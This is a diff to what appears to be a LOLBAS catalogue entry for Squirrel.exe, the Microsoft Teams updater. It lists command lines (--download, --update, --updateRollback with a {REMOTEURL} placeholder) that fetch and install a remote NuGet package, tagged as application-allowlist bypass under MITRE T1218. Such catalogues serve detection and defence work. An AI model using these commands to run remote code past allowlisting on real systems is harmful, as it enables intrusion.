@@ -4,41 +4,53 @@ Description: Binary to update the existing installed Nuget/squirrel package. Par
 Author: 'Reegun J (OCBC Bank) - @reegun21'
 Created: 2019-06-26
 Commands:
-  - Command: squirrel.exe --download [url to package]
+  - Command: squirrel.exe --download {REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file and download the nuget package.
     Usecase: Download binary
     Category: Download
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: squirrel.exe --update [url to package]
+  - Command: squirrel.exe --update {REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: squirrel.exe --update [url to package]
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: squirrel.exe --update {REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: squirrel.exe --updateRollback=[url to package]
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: squirrel.exe --updateRollback={REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: squirrel.exe --updateRollback=[url to package]
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
+  - Command: squirrel.exe --updateRollback={REMOTEURL}
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
 Full_Path:
   - Path: 'C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe'
 Code_Sample:
